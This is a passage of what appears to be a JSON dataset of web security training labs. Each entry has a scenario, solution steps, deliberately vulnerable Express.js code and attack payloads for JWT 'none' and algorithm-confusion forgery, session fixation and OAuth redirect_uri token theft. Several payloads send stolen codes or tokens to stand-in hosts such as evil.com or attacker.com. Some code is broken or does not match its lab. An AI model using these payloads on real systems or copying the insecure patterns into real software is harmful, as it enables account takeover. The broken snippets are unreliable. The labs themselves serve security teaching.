        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'qwerty123' }; app.get('/login', (req, res) => { const sessionId = req.cookies.sid || Math.random().toString(36).substring(2); sessions[sessionId] = null; res.cookie('sid', sessionId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; if (users[username] === password) { sessions[sid] = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user) return res.send('Welcome back ' + user); res.status(403).send('Not authenticated'); }); app.listen(4000);",
        "payloads": [
          "sid=abc123 (preset in phishing link)",
          "POST /login with valid credentials while using attacker-supplied sid",
          "GET /my-account with sid=abc123"
        ]
      },
      {
        "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
        "Lab Description": "The application uses OAuth 2.0 for authentication, but its redirect_uri parameter validation is flawed. It accepts subdomain-based open redirect patterns, allowing attackers to steal authorization codes. To solve: Construct a malicious redirect_uri that leads to a domain you control, extract Carlos's authorization code, and complete the OAuth login flow.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Initiate the OAuth login flow with Burp Suite and intercept the authorization request.",
          "2. Modify the redirect_uri to a domain under your control, such as https://attacker.carlos.lab/oauth-capture.",
          "3. Trick Carlos into clicking the malicious OAuth link (simulate in Repeater).",
          "4. Capture the authorization code redirected to your controlled domain from the browser network tab or Burp.",
          "5. Exchange the stolen code with the real client_id and redirect_uri to obtain an access token and log in as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').urlencoded({ extended: true })); const authorizedRedirects = ['https://*.trusted.com/callback']; app.get('/auth', (req, res) => { const { redirect_uri, client_id } = req.query;  if (authorizedRedirects.some(uri => redirect_uri.includes(uri.replace('*.', '')))) { const code = 'authcode123'; res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid redirect_uri'); } }); app.post('/token', (req, res) => { const { code, client_id, redirect_uri } = req.body; if (code === 'authcode123') { res.json({ access_token: 'carlos_token_abc' }); } else { res.status(403).send('Invalid code'); } }); app.listen(4000);",
        "payloads": [
          "https://attacker.carlos.lab/oauth-capture?code=authcode123",
          "POST /token with { code: authcode123, redirect_uri: https://attacker.carlos.lab/oauth-capture, client_id: legit-app }"
        ]
      },
      {
        "Lab scenario": "JWT signature bypass via algorithm confusion in login API",
        "Lab Description": "The application uses JSON Web Tokens (JWT) for session management but fails to enforce secure verification of token signatures. The login endpoint signs JWTs with HMAC using a shared secret, but the backend accepts 'none' as the algorithm, bypassing signature validation entirely. To solve: Forge a valid JWT that grants access to Carlos’s account without needing valid credentials.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a login request and extract a valid JWT issued after logging into your own account.",
          "Decode the JWT using jwt.io or Burp Decoder to inspect the header and payload structure.",
          "Modify the token’s header to change the algorithm from 'HS256' to 'none' and change the payload’s sub claim to 'carlos'.",
          "Remove the signature part entirely, leaving just the header and payload base64url encoded and joined by a dot.",
          "Replay the modified JWT in the Authorization header of a /my-account request using Postman or Burp Repeater to gain access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'supersecure') { const token = jwt.sign({ sub: 'carlos' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(403).json({ error: 'Unauthorized' }); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] }); if (payload.sub === 'carlos') return res.send('Welcome to Carlos's account!'); } catch (e) { return res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Bypass Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
          "{ \"alg\": \"none\" }.{ \"sub\": \"carlos\" }",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ."
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID",
        "Lab Description": "The application issues session cookies using a sequential session ID pattern during unauthenticated visits. Upon login, the session ID is not regenerated. An attacker can set a victim’s session ID ahead of login and hijack the authenticated session. To solve: Fix Carlos’s session ID before he logs in, then hijack his session after he authenticates.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to browse the site anonymously and inspect the Set-Cookie header to observe sequential session ID patterns (e.g., session=abc100, abc101, etc.).",
          "Manually guess or brute-force a valid session ID and use an open redirect to get Carlos to visit the crafted URL with your session ID (simulate redirect injection).",
          "Wait for Carlos to log in, reusing the session ID you fixed via open redirect.",
          "Use Burp Repeater to access /my-account with the fixed session ID in the Cookie header.",
          "Confirm access to Carlos’s account, proving the session was successfully hijacked."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessionCounter = 100; const sessions = {}; app.get('/', (req, res) => { const sid = 'abc' + sessionCounter++; res.cookie('session', sid); sessions[sid] = { authenticated: false, user: null }; res.send('Session initialized'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (username === 'carlos' && password === 'hunter2') { sessions[sid] = { authenticated: true, user: 'carlos' }; res.send('Login successful'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid]?.authenticated && sessions[sid].user === 'carlos') { res.send('Carlos's account'); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "Cookie: session=abc104",
          "http://victim.site/redirect?url=http://lab.site/?session=abc104",
          "Burp Intruder attack against incrementing session IDs: abc100 to abc110"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration leading to open redirect trust abuse",
        "Lab Description": "The application uses a third-party OAuth provider to handle login via redirects. The redirect_uri is not validated securely, allowing attackers to inject arbitrary URLs and harvest authorization codes. To solve: Trick the OAuth flow to leak Carlos’s token and use it to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP or Burp Suite to initiate the login flow and observe the OAuth authorization request structure, including client_id and redirect_uri parameters.",
          "Modify the redirect_uri to point to your own server or a URL under your control that simulates a trusted subdomain (e.g., attacker.lab.com).",
          "Send the malicious link to the victim (Carlos) via social engineering. When Carlos clicks it and authorizes access, the authorization code will be redirected to your server.",
          "Exchange the stolen authorization code for an access token using the OAuth token endpoint.",
          "Replay the token using Postman to call /my-account with Authorization: Bearer <token> and access Carlos’s account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const oauthProvider = 'https://auth.example.com'; const clientID = 'app-client-123'; const clientSecret = 'secret'; const redirectURIs = ['https://app.com/callback']; app.get('/login', (req, res) => { const redirect = req.query.redirect_uri; if (!redirect.startsWith('https://app.com')) return res.status(400).send('Invalid redirect'); const url = `${oauthProvider}/authorize?client_id=${clientID}&redirect_uri=${redirect}&response_type=code`; res.redirect(url); }); app.get('/callback', async (req, res) => { const { code } = req.query; const tokenResp = await axios.post(`${oauthProvider}/token`, { code, client_id: clientID, client_secret: clientSecret }); const accessToken = tokenResp.data.access_token; if (accessToken === 'token-carlos') res.send('Carlos's account'); else res.send('Access denied'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",
        "payloads": [
          "https://auth.example.com/authorize?client_id=app-client-123&redirect_uri=https://attacker.com/callback&response_type=code",
          "Stolen code exchanged via curl: curl -X POST -d 'code=leakedcode&client_id=app-client-123&client_secret=secret' https://auth.example.com/token",
          "Authorization: Bearer token-carlos"
        ]
      },   
      {
        "Lab scenario": "JWT tampering via algorithm confusion",
        "Lab Description": "This lab's login system uses JWTs for session management and accepts unsigned tokens due to a flawed algorithm check. The application fails to validate the algorithm used in the JWT header. To solve: Forge a JWT token that grants access to Carlos's account using algorithm confusion.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite or Postman to capture a valid JWT issued after login.",
          "Inspect the JWT in jwt.io or a local script to analyze its header and payload.",
          "Change the algorithm in the JWT header from HS256 to 'none' and remove the signature section.",
          "Replace the payload username with 'carlos' to impersonate the victim.",
          "Send the forged token in the Authorization header to access /my-account and confirm access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'supersecure') { const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, secret); res.send(`Welcome ${payload.username}`); } catch (e) { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('JWT lab running on http://localhost:4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "Session fixation via insecure session handling",
        "Lab Description": "This lab's session management system is vulnerable to session fixation. It reuses session IDs across login flows and does not regenerate tokens upon authentication. The application accepts pre-assigned session cookies before login. To solve: Fixate a session and force Carlos to use it, then access /my-account with the same session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to capture the initial session cookie assigned before login.",
          "Send Carlos a phishing link that pre-sets the session ID via a crafted request.",
          "Use the same session ID on your side and wait for Carlos to log in.",
          "Replay the session using the fixed cookie after Carlos logs in.",
          "Access /my-account to confirm the session hijack."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixationkey', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const user = users.find(u => u.username === req.body.username && u.password === req.body.password); if (user) { req.session.user = user.username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send(`Welcome ${req.session.user}`); } else { res.send('Please log in'); } }); app.listen(4001, () => console.log('Session Fixation Lab running on http://localhost:4001'));",
        "payloads": [
          "Set-Cookie: connect.sid=sessid123;",
          "GET /login?session=connect.sid=sessid123",
          "Cookie: connect.sid=sessid123"
        ]
      },
      {
        "Lab scenario": "OAuth redirect manipulation leading to account takeover",
        "Lab Description": "This lab's OAuth flow contains an open redirect flaw on the redirect_uri parameter. The application trusts user-supplied redirect URIs without proper validation, enabling account takeover via third-party OAuth provider token reuse. To solve: Manipulate the redirect URI to capture Carlos’s OAuth token and use it to access /my-account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept the OAuth login request and analyze the redirect_uri parameter.",
          "Modify the redirect_uri to a malicious endpoint you control and host it via an HTTP server.",
          "Send the crafted login link to Carlos and wait for the redirect with the authorization code/token.",
          "Exchange the captured code for an access token via a crafted POST request to the OAuth provider.",
          "Replay the token with the session API to log in as Carlos and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/login', (req, res) => { const redirect = req.query.redirect_uri; const oauthUrl = `https://oauth.example.com/auth?client_id=abc123&redirect_uri=${redirect}&response_type=code`; res.redirect(oauthUrl); }); app.get('/callback', async (req, res) => { const code = req.query.code; const tokenResponse = await axios.post('https://oauth.example.com/token', { code, client_id: 'abc123', client_secret: 'xyz789' }); const user = await axios.get('https://oauth.example.com/userinfo', { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` } }); res.send(`Welcome ${user.data.username}`); }); app.listen(4002, () => console.log('OAuth Redirect Lab running on http://localhost:4002'));",
        "payloads": [
          "https://vulnerable.app/login?redirect_uri=https://evil.com/callback",
          "https://evil.com/callback?code=oauthleak123",
          "POST https://oauth.example.com/token with code=oauthleak123"
        ]
      },
      {
        "Lab scenario": "Session fixation leads to MFA bypass",
        "Lab Description": "The application incorrectly allows session identifiers to persist across authentication states, including 2FA. Once a valid user completes login, the session ID issued before 2FA is reused without validation. The application trusts the existing session cookie to grant full access after 2FA step, without re-verifying ownership. To solve: Use session fixation to access Carlos's account without completing MFA.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept GET /login and extract the session cookie issued before login.",
          "2. Log in to your own account and complete the 2FA flow while observing that session ID remains the same.",
          "3. Log out and prepare a script using Postman or Repeater to login as Carlos with known credentials (skipping 2FA).",
          "4. Fix the session ID to the one obtained before login and inject it before login process completes.",
          "5. Use the fixed session to directly access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'vuln-secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'carlospass', is2FAEnabled: true }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; if (user.is2FAEnabled) return res.redirect('/verify'); res.send('Welcome'); } else res.status(403).send('Invalid'); }); app.get('/verify', (req, res) => { res.send('2FA code sent'); }); app.post('/verify', (req, res) => { req.session.authenticated = true; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send(`Account page for ${req.session.username}`); else res.status(403).send('Forbidden'); }); app.listen(4000);",
        "payloads": [
          "Reuse pre-auth session cookie after logging in as Carlos",
          "Fix session cookie from anonymous request and bypass MFA step"
        ]
      },
      {
        "Lab scenario": "JWT authentication bypass via 'none' algorithm",
        "Lab Description": "The application uses JWT tokens for session management but fails to validate the cryptographic algorithm used. If the 'alg' field in the JWT header is set to 'none', the application accepts unsigned tokens. To solve: Forge a JWT token with 'none' algorithm to impersonate Carlos and access the protected account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to capture the Authorization Bearer token after logging in with your own account.",
          "2. Decode the JWT token using jwt.io or CyberChef to view the header and payload.",
          "3. Modify the header to use 'alg':'none' and change the payload sub to 'carlos'.",
          "4. Remove the signature and rebuild the JWT using base64url encoding.",
          "5. Replace the Authorization header with the forged token and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = ['carlos']; app.use((req, res, next) => { const auth = req.headers['authorization']; if (auth) { const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); req.user = payload.payload.sub; } next(); }); app.get('/my-account', (req, res) => { if (users.includes(req.user)) res.send(`Account details for ${req.user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
          "Authorization: Bearer <JWT with alg=none and sub=carlos>"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration via open redirect",
        "Lab Description": "This lab demonstrates an OAuth misconfiguration where the 'redirect_uri' parameter is not properly validated during the authorization flow. The application allows arbitrary redirect URIs, enabling token theft via open redirection. To solve: Intercept Carlos's OAuth authorization and redirect the token to your own server.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. With OWASP ZAP, proxy the OAuth login request and note the redirect_uri parameter.",
          "2. Confirm that arbitrary redirect URIs are accepted and reflected in the response.",
          "3. Host a malicious server (e.g., using Python SimpleHTTPServer or ngrok) to receive stolen tokens.",
          "4. Craft a malicious OAuth URL with redirect_uri pointing to your malicious server.",
          "5. Send the OAuth URL to Carlos (simulate click), intercept token at your server, and use it to access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, token } = req.query; res.redirect(`${redirect_uri}?token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.query.token; if (token === 'carlos-access-token') res.send('Welcome Carlos'); else res.status(401).send('Access denied'); }); app.listen(4000);",
        "payloads": [
          "https://vulnerable-app.com/auth?redirect_uri=https://attacker.com&token=carlos-access-token",
          "https://attacker.com/?token=carlos-access-token"
        ]
      },
      {
        "Lab scenario": "JWT token none algorithm bypass in API auth flow",
        "Lab Description": "This lab's REST API uses JWT tokens for authentication. The server does not validate the JWT signature when the algorithm is set to 'none'. The application processes JWTs without verifying the integrity of the claims. To solve: forge a JWT for the user 'carlos' and access the protected API endpoint /api/account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a valid JWT issued after login using Burp Suite or Postman.",
          "Decode the JWT using jwt.io and observe the 'alg' field is set to 'HS256'.",
          "Replace the 'alg' value with 'none' and set 'sub' or 'user' claim to 'carlos'.",
          "Remove the signature part of the token (third segment after the second dot).",
          "Use the modified JWT in the Authorization: Bearer header to request /api/account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'hunter2' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid login'); const token = jwt.sign({ user: username }, 'supersecret'); res.json({ token }); }); app.get('/api/account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const user = decoded.payload.user; if (user === 'carlos') return res.send('Sensitive account info'); } else { jwt.verify(token, 'supersecret'); return res.send('Standard account info'); } } catch (e) { return res.status(400).send('Invalid token'); } }); app.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable token reuse",
        "Lab Description": "The application uses session tokens in URL parameters and fails to regenerate the session upon authentication. An attacker can fix a session identifier and trick the victim into logging in with it, gaining access to their authenticated session. To solve: hijack Carlos’s session by pre-setting a known session token before login.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Access the site and note the session token included in URLs, e.g., ?sid=abc123.",
          "Send the victim a crafted login URL containing a known session token: /login?sid=attacker123.",
          "Use Postman or OWASP ZAP to log in using this session token.",
          "After victim logs in via the malicious link, wait and reuse the same session token.",
          "Access /account?sid=attacker123 to take over the victim session."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const users = [{ username: 'carlos', password: 'letmein' }]; let sessions = {}; app.get('/login', (req, res) => { const sid = req.query.sid || Math.random().toString(36).substring(2); sessions[sid] = { loggedIn: false }; res.send(`<form method='POST' action='/login?sid=${sid}'><input name='username'><input name='password'><button>Login</button></form>`); }); app.post('/login', (req, res) => { const sid = req.query.sid; let body = ''; req.on('data', chunk => body += chunk); req.on('end', () => { const params = new URLSearchParams(body); const user = users.find(u => u.username === params.get('username') && u.password === params.get('password')); if (user) sessions[sid].loggedIn = true; res.redirect(`/account?sid=${sid}`); }); }); app.get('/account', (req, res) => { const sid = req.query.sid; if (sessions[sid] && sessions[sid].loggedIn) res.send('Sensitive data for logged in user'); else res.send('Not authenticated'); }); app.listen(4000);",
        "payloads": [
          "/login?sid=attacker123",
          "/account?sid=attacker123",
          "POST /login?sid=attacker123"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration with open redirect and no state parameter",
        "Lab Description": "This lab demonstrates an OAuth implementation that fails to validate the 'state' parameter, exposing it to CSRF and token theft via open redirection. The application blindly trusts the redirect URI and leaks access tokens. To solve: craft a malicious authorization request that sends Carlos’s token to your controlled server.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to initiate a login flow and capture the authorization URL.",
          "Observe that the 'state' parameter is either absent or not enforced by the app.",
          "Modify the redirect_uri to a malicious URL you control (e.g., https://evil.com/capture).",
          "Send this crafted URL to Carlos via phishing or simulate the redirect.",
          "Capture the access token in your server and replay it against /account API."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const axios = require('axios'); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'token-for-carlos'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer token-for-carlos') res.send('Carlos account info'); else res.status(403).send('Invalid token'); }); app.listen(5000);",
        "payloads": [
          "https://vulnerable-app.com/auth?redirect_uri=https://evil.com/capture",
          "Authorization: Bearer token-for-carlos"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion in token verification endpoint",
        "Lab Description": "This lab implements a stateless authentication mechanism using JSON Web Tokens (JWTs). However, the server is vulnerable to an algorithm confusion flaw due to improper handling of the JWT 'alg' field. The application accepts tokens signed using both 'HS256' and 'RS256', using a single public key to verify all incoming tokens. To solve the lab, forge a valid admin token and access the administrative panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to capture a valid JWT after logging in as a regular user.",
          "2. Use jwt.io or a script to decode the token and analyze the payload and header.",
          "3. Modify the 'alg' field in the JWT header to 'HS256' and replace the 'sub' claim with 'admin'.",
          "4. Use the server’s public key (obtained from /public.pem) as the HMAC secret to sign the modified JWT using HS256.",
          "5. Submit the forged JWT as a cookie and access /admin to verify successful privilege escalation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const pubKey = fs.readFileSync('./public.pem'); app.get('/login', (req, res) => { const user = req.query.user || 'guest'; const token = jwt.sign({ sub: user, role: 'user' }, pubKey, { algorithm: 'RS256' }); res.cookie('auth', token); res.send(`Token issued for ${user}`); }); app.get('/admin', (req, res) => { try { const token = req.cookies.auth; const decoded = jwt.verify(token, pubKey); if (decoded.sub === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Access denied'); } } catch (err) { res.status(401).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Header: {\"alg\":\"HS256\"}, Payload: {\"sub\":\"admin\"}, Signed with public.pem as secret",
          "jwt.sign({sub:'admin'}, pubKey, {algorithm: 'HS256'})"
        ]
      },
      {
        "Lab scenario": "Session fixation via insecure cookie reassignment",
        "Lab Description": "This lab's session management is flawed. The application does not regenerate the session ID upon successful login, allowing an attacker to fix the victim's session ID prior to authentication. The application accepts a session ID as a query parameter and reflects it into a cookie. To solve the lab, fix a session ID for Carlos and trick him into logging in, then use the same session ID to access his account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Postman to craft a GET request to /set-session?sid=attacker123 and observe that the Set-Cookie header reflects the session ID.",
          "2. Share a crafted link like /login?sid=attacker123 with Carlos via the simulated email client.",
          "3. Wait for Carlos to log in using the attacker-controlled session ID.",
          "4. Use the same session ID cookie 'sid=attacker123' in a request to /my-account.",
          "5. Confirm you are logged in as Carlos and view his account details."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'abc123' }]; app.get('/set-session', (req, res) => { const { sid } = req.query; res.cookie('sid', sid); res.send('Session set'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Invalid credentials'); const sid = req.cookies.sid || `sess_${Math.random().toString(36).substring(2)}`; sessions[sid] = username; res.cookie('sid', sid); res.send('Login successful'); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sid]; if (username) res.send(`Welcome ${username}`); else res.status(403).send('Access denied'); }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "/set-session?sid=attacker123",
          "/login?sid=attacker123",
          "Cookie: sid=attacker123"
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow token leakage via referrer header",
        "Lab Description": "This lab demonstrates how improper use of the OAuth 2.0 implicit flow results in access token leakage via the HTTP Referer header. The vulnerable application redirects users with an access token in the URL fragment. An attacker-controlled site can trick authenticated users into visiting a resource which leaks the token in the Referer header. To solve the lab, steal Carlos's access token and access the /private-data endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Set up a listener (e.g., https://attacker.com/log) and host a malicious page that loads an image from /profile#access_token=XYZ.",
          "2. Send Carlos a crafted link to https://attacker.com?redirect=https://vulnerable.com/profile#access_token=XYZ.",
          "3. Carlos's browser loads the image from the vulnerable app with the token in the fragment.",
          "4. The fragment is not sent to the server, but if redirected to another page with the token appended to the query string, it leaks via the Referer header.",
          "5. Capture the access token in your server logs and reuse it by sending a request with Authorization: Bearer <token> to /private-data.",
          "6. Confirm access to private data and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos-token': 'carlos' }; app.get('/authorize', (req, res) => { const redirect = req.query.redirect_uri; const token = 'carlos-token'; res.redirect(`${redirect}#access_token=${token}`); }); app.get('/private-data', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const user = tokens[token]; if (!user) return res.status(403).send('Invalid token'); res.send(`Private data of ${user}`); }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Token Leakage Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://vulnerable.com/profile#access_token=carlos-token",
          "Authorization: Bearer carlos-token"
        ]
      },
      {
        "Lab scenario": "JWT none algorithm bypass in REST API login flow",
        "Lab Description": "The application uses JSON Web Tokens (JWTs) to manage sessions and validate authenticated users via a RESTful login API. However, it incorrectly accepts the 'none' algorithm in JWTs, allowing token forgery. The application trusts the JWT payload without signature verification when 'alg' is set to 'none'. To solve: Forge a JWT for the user carlos and access their account page using the tampered token.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Postman to send valid credentials to the /api/login endpoint and retrieve a signed JWT.",
          "2. Decode the JWT using jwt.io or a JWT decoder in Burp Suite to inspect the header and payload structure.",
          "3. Modify the JWT header by changing the 'alg' field to 'none', and alter the payload to set 'username' to 'carlos'.",
          "4. Remove the signature portion entirely and send the tampered token in the Authorization header: 'Bearer <token>'.",
          "5. Verify access to /api/account and check that the response contains Carlos’s data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'supersecret' }]; app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/api/account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'carlos') { res.send('Sensitive account data for carlos'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "{ \"alg\": \"none\" }.{ \"username\": \"carlos\" }.",
          "JWT crafted with alg: none, no signature, username: carlos"
        ]
      },
      {
        "Lab scenario": "OAuth redirect URI manipulation",
        "Lab Description": "This application uses OAuth2 for third-party login, but fails to properly validate redirect URIs. It accepts user-controlled input in the redirect_uri parameter during the authorization flow. To solve: Trick the OAuth provider to send an access token to your controlled domain, then use the token to gain access to Carlos’s account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP or Burp Suite to intercept the OAuth authorization flow during login with Google.",
          "2. Modify the redirect_uri parameter in the authorization request to a domain you control (e.g., https://evil.com/callback).",
          "3. Simulate the OAuth flow and capture the token returned to your malicious redirect URI.",
          "4. Replay the login request with the captured token, modifying the Authorization header to include: Bearer <token>.",
          "5. Use the token to access /my-account endpoint as carlos and verify lab completion."
        ],
        "Vulnerability name": "Authentication",
